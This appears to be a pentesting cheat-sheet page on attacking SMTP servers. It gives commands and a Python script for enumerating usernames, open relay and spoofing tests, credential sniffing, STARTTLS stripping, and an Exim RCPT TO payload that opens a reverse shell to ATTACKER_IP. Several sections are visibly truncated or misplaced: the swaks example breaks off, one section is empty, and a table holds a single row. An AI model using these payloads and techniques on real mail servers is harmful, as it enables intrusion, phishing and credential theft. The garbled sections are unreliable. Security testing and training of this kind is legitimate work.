> **SMTP (Simple Mail Transfer Protocol)** is responsible for sending and relaying emails between mail servers. It operates on **Port 25** (unencrypted relay), **Port 465** (SMTPS — implicit TLS), and **Port 587** (submission — STARTTLS). From a pentesting perspective, SMTP is a **goldmine** for user enumeration, email spoofing, credential harvesting, open relay abuse, and even remote code execution through vulnerable mail server software.

::card-group
  ::card
  ---
  title: User Enumeration
  icon: i-lucide-users
  ---
  SMTP commands `VRFY`, `EXPN`, and `RCPT TO` can confirm valid usernames on the target system — one of the **most reliable** enumeration vectors.
  ::

  ::card
  ---
  title: Email Spoofing
  icon: i-lucide-mail-warning
  ---
  Missing SPF/DKIM/DMARC records allow sending emails as **any user** from the target domain — critical for phishing engagements.
  ::

  ::card
  ---
  title: Open Relay
  icon: i-lucide-arrow-right-left
  ---
  Misconfigured mail servers that relay emails without authentication enable **spam campaigns** and **phishing** through the target infrastructure.

## How SMTP Works

Understanding SMTP internals helps identify attack vectors more effectively.

::steps{level="4"}

#### Client Connects

The client (MUA — Mail User Agent) connects to the SMTP server on port 25/465/587 and initiates a session.

#### HELO / EHLO Handshake

```
EHLO attacker.local
```

The server responds with supported extensions (STARTTLS, AUTH, SIZE, VRFY, etc.). `EHLO` reveals **server capabilities** — critical for recon.

#### Sender & Recipient Declaration

```
MAIL FROM:<sender@domain.com>
RCPT TO:<recipient@target.com>
```

The server validates the sender and recipient. Response codes reveal whether users exist.

#### Data Transmission

```
DATA
Subject: Test Email
This is the email body.
.
```

The email content is transmitted. Headers can be manipulated for spoofing.

#### Connection Closure

```
QUIT
```

::

### SMTP Response Codes

::collapsible

| Code | Meaning | Pentesting Relevance |
|------|---------|---------------------|
| `220` | Service ready | Banner reveals software version |
| `250` | Action completed | User exists (VRFY/RCPT TO) |
| `251` | User not local, will forward | Relay behavior detected |
| `252` | Cannot verify, will attempt | User may exist |
| `354` | Start mail input | Ready for DATA |
| `421` | Service unavailable | Rate limiting / firewall |
| `450` | Mailbox unavailable | Temporary failure |
| `500` | Syntax error | Command not recognized |
| `501` | Syntax error in parameters | Invalid arguments |
| `502` | Command not implemented | VRFY/EXPN disabled |
| `503` | Bad sequence of commands | Protocol violation |
| `550` | Mailbox unavailable | **User does NOT exist** |
| `551` | User not local | Forwarding address revealed |
| `553` | Mailbox name not allowed | Invalid address format |

::

### Common SMTP Software

| Software | Platform | Default Config File | Known For |
|----------|----------|-------------------|-----------|
| **Postfix** | Linux | `/etc/postfix/main.cf` | Most common Linux MTA |
| **Exim** | Linux | `/etc/exim4/exim4.conf` | Debian default, many CVEs |
| **Sendmail** | Linux/Unix | `/etc/mail/sendmail.cf` | Legacy, complex config |
| **Microsoft Exchange** | Windows | Registry/AD | Enterprise, ProxyLogon/ProxyShell |
| **hMailServer** | Windows | `hMailServer.ini` | Windows open-source |
| **OpenSMTPD** | BSD/Linux | `/etc/smtpd.conf` | CVE-2020-7247 RCE |
| **Haraka** | Node.js | `config/` directory | CVE-2017-16957 RCE |
| **Zimbra** | Linux | `/opt/zimbra/` | CVE-2022-27925, CVE-2024-45519 |

::field-group
  ::field{name="VRFY" type="critical"}
  If VRFY is listed, you can **directly verify** whether a username exists on the system. This is the easiest enumeration method.
  ::

  ::field{name="EXPN" type="critical"}
  EXPN expands mailing lists and aliases, revealing **all members** of a distribution list — exposes multiple usernames at once.
  ::

  ::field{name="AUTH PLAIN LOGIN" type="important"}
  Authentication is supported — brute force attacks are possible. `PLAIN` and `LOGIN` methods transmit credentials in **base64** (easily decoded).
  ::

  ::field{name="STARTTLS" type="medium"}
  TLS upgrade is available. Check if it's **required** or optional — if optional, credentials may be sent in plaintext.
  ::

  ::field{name="SIZE" type="low"}
  Maximum message size — relevant for attachment-based attacks and mail bombing.
  ::

  ::field{name="DSN" type="low"}
  Delivery Status Notifications — can be abused to confirm email delivery and recipient existence.
  ::
::

### NTLM Information Disclosure

If the SMTP server supports **NTLM authentication** (common with Exchange), you can extract internal information without credentials.

```bash [Terminal]
nmap -p 25 --script smtp-ntlm-info $IP
```

```bash [Manual - Telnet]
telnet $IP 25
EHLO test
AUTH NTLM
# Send base64-encoded NTLMSSP_NEGOTIATE message
TlRMTVNTUAABAAAAB4IIAAAAAAAAAAAAAAAAAAAAAAA=
# Server responds with NTLMSSP_CHALLENGE containing:
# - NetBIOS domain name
# - NetBIOS computer name  
# - DNS domain name
# - DNS computer name
# - Timestamp
```

::note
NTLM info disclosure reveals **internal domain names**, **computer names**, and **Active Directory domain** — valuable for building attack paths in AD environments.

## User Enumeration

User enumeration is the **most valuable** attack against SMTP. Three methods exist, each with different reliability and stealth levels.

### Method 1: VRFY Command

The `VRFY` command directly asks the server if a username exists.

::tabs
  :::tabs-item{icon="i-lucide-eye" label="Manual"}
  ```bash [Terminal]
  telnet $IP 25
  EHLO attacker.local
  VRFY root
  250 2.1.5 root <root@mail.target.com>    ← EXISTS
  VRFY admin
  250 2.1.5 admin <admin@mail.target.com>  ← EXISTS
  VRFY nonexistentuser
  550 5.1.1 <nonexistentuser>: Recipient address rejected  ← DOES NOT EXIST
  VRFY postmaster
  252 2.0.0 postmaster                     ← CANNOT VERIFY (may exist)
  ```
  :::

  :::tabs-item{icon="i-lucide-code" label="Automated"}
  ```bash [smtp-user-enum]
  smtp-user-enum -M VRFY -U /usr/share/seclists/Usernames/Names/names.txt -t $IP
  ```

  ```bash [Nmap]
  nmap -p 25 --script smtp-enum-users --script-args smtp-enum-users.methods={VRFY} $IP
  ```

  ```bash [Metasploit]
  use auxiliary/scanner/smtp/smtp_enum
  set RHOSTS $IP
  set UNIXONLY true
  set USER_FILE /usr/share/seclists/Usernames/Names/names.txt
  run
  ```
  :::
::

### Method 2: RCPT TO Command

If VRFY is disabled, use `RCPT TO` to check if a recipient address is valid. This is **more stealthy** and harder to block.

::tabs
  :::tabs-item{icon="i-lucide-eye" label="Manual"}
  ```bash [Terminal]
  telnet $IP 25
  EHLO attacker.local
  MAIL FROM:<attacker@evil.com>
  250 2.1.0 Ok
  RCPT TO:<admin@target.com>
  250 2.1.5 Ok                              ← USER EXISTS
  RCPT TO:<nonexistent@target.com>
  550 5.1.1 <nonexistent@target.com>: Recipient address rejected  ← DOES NOT EXIST
  RCPT TO:<hr@target.com>
  250 2.1.5 Ok                              ← USER EXISTS
  RSET
  ```
  :::

  :::tabs-item{icon="i-lucide-code" label="Automated"}
  ```bash [smtp-user-enum]
  smtp-user-enum -M RCPT -U /usr/share/seclists/Usernames/Names/names.txt -D target.com -t $IP
  ```

  ```bash [Nmap]
  nmap -p 25 --script smtp-enum-users --script-args smtp-enum-users.methods={RCPT},smtp-enum-users.domain=target.com $IP
  ```
  :::
::

### Method 3: EXPN Command

`EXPN` expands mailing list aliases and reveals all members — a **one-shot multi-user enumeration**.

::tabs
  :::tabs-item{icon="i-lucide-eye" label="Manual"}
  ```bash [Terminal]
  telnet $IP 25
  EHLO attacker.local
  EXPN all-staff
  250-admin@target.com
  250-john@target.com
  250-jane@target.com
  250 bob@target.com
  EXPN postmaster
  250 root@target.com
  ```
  :::

  :::tabs-item{icon="i-lucide-code" label="Automated"}
  ```bash [smtp-user-enum]
  smtp-user-enum -M EXPN -U /usr/share/seclists/Usernames/Names/names.txt -t $IP
  ```
  :::
::

| Method | Reliability | Stealth | Often Disabled | Best For |
|--------|------------|---------|----------------|----------|
| `VRFY` | ⭐⭐⭐⭐⭐ | ⭐⭐ | Yes | Direct username validation |

### Custom Python Enumeration Script

::code-collapse

```python [smtp_enum.py]
#!/usr/bin/env python3
"""
SMTP User Enumeration Script
Supports VRFY, RCPT TO, and EXPN methods
"""

import socket
import sys
import argparse
from concurrent.futures import ThreadPoolExecutor, as_completed
from colorama import Fore, Style, init

init()

def vrfy_check(target, port, username, timeout=10):
    """Check username via VRFY command"""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((target, port))
        banner = s.recv(1024).decode().strip()
        
        s.send(f'EHLO attacker.local\r\n'.encode())
        s.recv(1024)
        
        s.send(f'VRFY {username}\r\n'.encode())
        response = s.recv(1024).decode().strip()
        
        s.send(b'QUIT\r\n')
        s.close()
        
        code = int(response[:3])
        if code == 250:
            return (username, True, response)
        elif code == 252:
            return (username, 'maybe', response)
        else:
            return (username, False, response)
    except Exception as e:
        return (username, False, str(e))

def rcpt_check(target, port, username, domain, timeout=10):
    """Check username via RCPT TO command"""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((target, port))
        s.recv(1024)
        
        s.send(b'EHLO attacker.local\r\n')
        s.recv(1024)
        
        s.send(b'MAIL FROM:<test@attacker.local>\r\n')
        s.recv(1024)
        
        s.send(f'RCPT TO:<{username}@{domain}>\r\n'.encode())
        response = s.recv(1024).decode().strip()
        
        s.send(b'RSET\r\n')
        s.recv(1024)
        s.send(b'QUIT\r\n')
        s.close()
        
        code = int(response[:3])
        if code == 250:
            return (f'{username}@{domain}', True, response)
        else:
            return (f'{username}@{domain}', False, response)
    except Exception as e:
        return (f'{username}@{domain}', False, str(e))

def main():
    parser = argparse.ArgumentParser(description='SMTP User Enumeration')
    parser.add_argument('-t', '--target', required=True, help='Target IP')
    parser.add_argument('-p', '--port', type=int, default=25, help='SMTP port')
    parser.add_argument('-U', '--userlist', required=True, help='Username wordlist')
    parser.add_argument('-M', '--method', choices=['VRFY', 'RCPT'], default='VRFY')
    parser.add_argument('-d', '--domain', default='target.com', help='Domain for RCPT')
    parser.add_argument('-T', '--threads', type=int, default=5, help='Thread count')
    args = parser.parse_args()

    with open(args.userlist, 'r') as f:
        usernames = [line.strip() for line in f if line.strip()]

    print(f"{Fore.CYAN}[*] Target: {args.target}:{args.port}")
    print(f"[*] Method: {args.method}")
    print(f"[*] Users to test: {len(usernames)}{Style.RESET_ALL}\n")

    found_users = []

    with ThreadPoolExecutor(max_workers=args.threads) as executor:
        if args.method == 'VRFY':
            futures = {executor.submit(vrfy_check, args.target, args.port, u): u for u in usernames}
        else:
            futures = {executor.submit(rcpt_check, args.target, args.port, u, args.domain): u for u in usernames}

        for future in as_completed(futures):
            user, exists, response = future.result()
            if exists == True:
                print(f"{Fore.GREEN}[+] FOUND: {user} — {response}{Style.RESET_ALL}")
                found_users.append(user)
            elif exists == 'maybe':
                print(f"{Fore.YELLOW}[?] MAYBE: {user} — {response}{Style.RESET_ALL}")

    print(f"\n{Fore.CYAN}[*] Enumeration complete. Found {len(found_users)} valid users.{Style.RESET_ALL}")
    
    if found_users:
        with open('smtp_valid_users.txt', 'w') as f:
            f.write('\n'.join(found_users))
        print(f"{Fore.GREEN}[+] Results saved to smtp_valid_users.txt{Style.RESET_ALL}")

if __name__ == '__main__':
    main()
```

## Recon Methodology

### DNS Email Security Records

Before attacking SMTP, always check DNS records for email security configurations. **Missing records = spoofing possible**.

::steps{level="4"}

#### SPF Record Check

```bash [Terminal]
dig +short TXT target.com | grep -i spf
# Example output:
# "v=spf1 mx ip4:10.10.10.25 -all"    ← Strict (hard to spoof)
# "v=spf1 mx ~all"                      ← Soft fail (spoofable)
# No record found                       ← NO SPF (fully spoofable!)
```

::field-group
  ::field{name="-all (Hard Fail)" type="info"}
  Emails from unauthorized sources are **rejected**. Spoofing is difficult but not impossible (internal relay may bypass).
  ::

  ::field{name="~all (Soft Fail)" type="warning"}
  Emails from unauthorized sources are **marked as suspicious** but still delivered. Spoofing is **possible**.
  ::

  ::field{name="+all or No Record" type="critical"}
  **No restrictions** — emails can be spoofed from any source. Ideal for phishing engagements.
  ::


#### DKIM Record Check

```bash [Terminal]
# DKIM selectors vary — try common ones
dig +short TXT default._domainkey.target.com
dig +short TXT selector1._domainkey.target.com
dig +short TXT google._domainkey.target.com
dig +short TXT mail._domainkey.target.com
```

#### DMARC Record Check

```bash [Terminal]
dig +short TXT _dmarc.target.com
# Example output:
# "v=DMARC1; p=none; rua=mailto:dmarc@target.com"   ← Monitor only (spoofable!)
# "v=DMARC1; p=reject; ..."                           ← Strict policy
# No record found                                      ← NO DMARC (spoofable!)
```

#### MX Record Enumeration

```bash [Terminal]
dig MX target.com +short
# Reveals mail server hostnames and priorities
# 10 mail.target.com.
# 20 mail2.target.com.

# Resolve to IPs
dig +short A mail.target.com
```


### Complete Recon Checklist

::field-group
  ::field{name="1. Banner Grabbing" type="critical"}
  Identify SMTP software and version. Cross-reference with CVE databases for known exploits.
  ::

  ::field{name="2. EHLO Capabilities" type="critical"}
  Map supported commands — especially `VRFY`, `EXPN`, `AUTH`, `STARTTLS`. Each reveals different attack paths.
  ::

  ::field{name="3. User Enumeration" type="critical"}
  Enumerate valid usernames via `VRFY`, `RCPT TO`, or `EXPN`. Valid users feed into brute force, phishing, and password spraying attacks.
  ::

  ::field{name="4. SPF/DKIM/DMARC" type="critical"}
  Check email security DNS records. Missing or misconfigured records enable email spoofing for phishing campaigns.
  ::

  ::field{name="5. Open Relay Check" type="critical"}
  Test if the server relays emails without authentication. Open relays enable sending emails through the target's infrastructure.
  ::

  ::field{name="6. NTLM Info Disclosure" type="important"}
  If NTLM auth is supported (Exchange), extract internal domain/hostname information.
  ::

  ::field{name="7. STARTTLS Downgrade" type="important"}
  Test if TLS is mandatory or optional. If optional, credentials can be captured via MITM.
  ::

  ::field{name="8. Auth Methods" type="important"}
  Identify supported auth mechanisms (`PLAIN`, `LOGIN`, `CRAM-MD5`, `NTLM`). `PLAIN` and `LOGIN` transmit base64-encoded (easily reversible) credentials.
  ::

  ::field{name="9. Internal Mail Headers" type="medium"}
  Send a test email and examine received headers for internal IP addresses, hostnames, and software versions.
  ::

  ::field{name="10. Version-Specific CVEs" type="medium"}
  Research identified software versions for public exploits — Exim, OpenSMTPD, Haraka, Exchange all have critical RCE CVEs.
  ::
::

## Pentesting Methods

### Open Relay Testing

An **open relay** allows anyone to send email through the server without authentication — enabling spam, phishing, and reputation attacks.

::accordion
  :::accordion-item{icon="i-lucide-arrow-right-left" label="Manual Open Relay Test"}
  ```bash [Terminal]
  telnet $IP 25
  EHLO attacker.local
  MAIL FROM:<attacker@evil.com>
  250 2.1.0 Ok
  RCPT TO:<test@gmail.com>            ← External recipient
  250 2.1.5 Ok                         ← OPEN RELAY CONFIRMED!
  # If you get 250 for an external recipient, the server is an open relay
  
  # vs. properly configured:
  RCPT TO:<test@gmail.com>
  554 5.7.1 <test@gmail.com>: Relay access denied  ← RELAY BLOCKED
  ```
  :::

  :::accordion-item{icon="i-lucide-scan" label="Automated Open Relay Test"}
  ```bash [Nmap]
  nmap -p 25 --script smtp-open-relay $IP
  ```

  ```bash [Nmap - Custom From/To]
  nmap -p 25 --script smtp-open-relay --script-args smtp-open-relay.from="test@evil.com",smtp-open-relay.to="test@gmail.com" $IP
  ```

  ```bash [swaks]
  swaks --to test@gmail.com --from attacker@evil.com --server $IP --header "Subject: Open Relay Test" --body "Relay test"
  ```

  ```bash [Metasploit]
  use auxiliary/scanner/smtp/smtp_relay
  set RHOSTS $IP
  run
  ```
  :::

  :::accordion-item{icon="i-lucide-list" label="Multiple Relay Test Scenarios"}
  Test various sender/recipient combinations to detect partial relay misconfigurations:

  ```bash [Terminal]
  telnet $IP 25
  EHLO test
  
  # Test 1: External → External
  MAIL FROM:<ext@evil.com>
  RCPT TO:<ext@gmail.com>
  RSET
  
  # Test 2: Internal → External  
  MAIL FROM:<user@target.com>
  RCPT TO:<ext@gmail.com>
  RSET
  
  # Test 3: External → Internal
  MAIL FROM:<ext@evil.com>
  RCPT TO:<user@target.com>
  RSET
  
  # Test 4: Internal → Internal (different domain)
  MAIL FROM:<user@target.com>
  RCPT TO:<user@otherdomain.com>
  RSET
  
  # Test 5: Empty MAIL FROM (bounce message)
  MAIL FROM:<>
  RCPT TO:<ext@gmail.com>
  RSET
  
  QUIT
  ```
  :::

### Email Spoofing & Phishing

::accordion
  :::accordion-item{icon="i-lucide-mail-warning" label="swaks — Swiss Army Knife for SMTP"}

  ```bash [Basic Spoofed Email]
  swaks --to victim@target.com \
        --from ceo@target.com \
  ```


  :::accordion-item{icon="i-lucide-terminal" label="sendemail Tool"}

### Credential Sniffing

::accordion
  :::accordion-item{icon="i-lucide-wifi" label="SMTP Credential Capture"}
  SMTP `AUTH PLAIN` and `AUTH LOGIN` transmit credentials in **base64** — easily decoded if intercepted.

  ```bash [tcpdump]
  # Capture SMTP traffic
  tcpdump -i eth0 -A port 25 -w smtp_capture.pcap
  ```

  ```bash [Wireshark Filters]
  # Filter SMTP auth
  smtp.req.command == "AUTH"
  
  # Follow TCP stream to see:
  # AUTH LOGIN
  # 334 VXNlcm5hbWU6        ← base64("Username:")
  # YWRtaW4=                 ← base64("admin")
  # 334 UGFzc3dvcmQ6        ← base64("Password:")
  # UGFzc3dvcmQxMjMh        ← base64("Password123!")
  ```

  ```bash [Decode Captured Credentials]
  echo "YWRtaW4=" | base64 -d
  # Output: admin
  echo "UGFzc3dvcmQxMjMh" | base64 -d
  # Output: Password123!
  ```
  :::

  :::accordion-item{icon="i-lucide-shield-off" label="STARTTLS Stripping Attack"}
  If STARTTLS is optional, perform a downgrade attack to capture credentials in plaintext.

  ```bash [striptls - SMTP Downgrade]
  # Install
  pip install striptls
  
  # Run proxy that strips STARTTLS
  striptls --listen 0.0.0.0:2525 --remote $IP:25
  
  # Victim connects to attacker:2525 thinking it's the mail server
  # STARTTLS is stripped, credentials sent in plaintext
  ```

  ```bash [Manual Exploitation]

  EHLO attacker.local
  MAIL FROM:<>
  RCPT TO:<${run{\x2Fbin\x2Fbash\x20-c\x20\x22bash\x20-i\x20\x3E\x26\x20\x2Fdev\x2Ftcp\x2FATTACKER_IP\x2F4444\x200\x3E\x261\x22}}@target.com>

  .
  QUIT
  ```

## Defensive Checks

::tip
If you're also doing **blue team** reporting, include these remediation recommendations for SMTP findings.
::

::accordion
  :::accordion-item{icon="i-lucide-shield-check" label="Hardening Checklist"}
  | Finding | Remediation | Priority |
  |---------|-------------|----------|
  | VRFY enabled | Disable VRFY: `disable_vrfy_command = yes` (Postfix) | 🔴 Critical |
  | EXPN enabled | Disable EXPN in server configuration | 🔴 Critical |
  | Open relay | Restrict relay: `mynetworks`, `smtpd_recipient_restrictions` | 🔴 Critical |
  | No SPF record | Add SPF TXT record: `v=spf1 mx -all` | 🔴 Critical |
  | No DMARC | Add DMARC: `v=DMARC1; p=reject; rua=mailto:dmarc@domain.com` | 🔴 Critical |
  | No DKIM | Configure DKIM signing for outbound emails | 🟠 High |
  | STARTTLS optional | Enforce TLS: `smtpd_tls_security_level = encrypt` | 🟠 High |
  | Weak AUTH methods | Disable PLAIN/LOGIN, use CRAM-MD5 or require TLS first | 🟠 High |
  | Banner info disclosure | Customize banner: `smtpd_banner = $myhostname ESMTP` | 🟡 Medium |
  | No rate limiting | Implement connection/message rate limits | 🟡 Medium |
  | Outdated software | Patch to latest version, monitor CVE advisories | 🔴 Critical |

## Attack Flow Diagram

::note
Follow this decision tree when encountering SMTP during a pentest:
::

::steps{level="4"}

#### Discovery & Banner Grab

```bash [Terminal]
nmap -sV -sC -p 25,465,587 $IP
nc -nv $IP 25
```
→ **Identify software + version** → Search for CVEs

#### EHLO & Capability Mapping

```bash [Terminal]
telnet $IP 25
EHLO attacker.local
```
→ **VRFY supported?** → User enumeration
→ **AUTH supported?** → Brute force / password spray
→ **STARTTLS optional?** → Downgrade attack

#### User Enumeration

```bash [Terminal]
smtp-user-enum -M VRFY -U users.txt -t $IP
smtp-user-enum -M RCPT -U users.txt -D target.com -t $IP
```
→ **Valid users found** → Feed into brute force, phishing, password spray

#### DNS Security Check

```bash [Terminal]
dig +short TXT target.com | grep spf
dig +short TXT _dmarc.target.com
```
→ **No SPF/DMARC?** → Email spoofing / phishing

#### Open Relay Check

```bash [Terminal]
nmap -p 25 --script smtp-open-relay $IP
```
→ **Open relay?** → Send emails through target infrastructure

#### Exploitation

```bash [Terminal]
# Based on identified software version
searchsploit exim
searchsploit opensmtpd
searchsploit "microsoft exchange"
```
→ **CVE found?** → RCE attempt

::
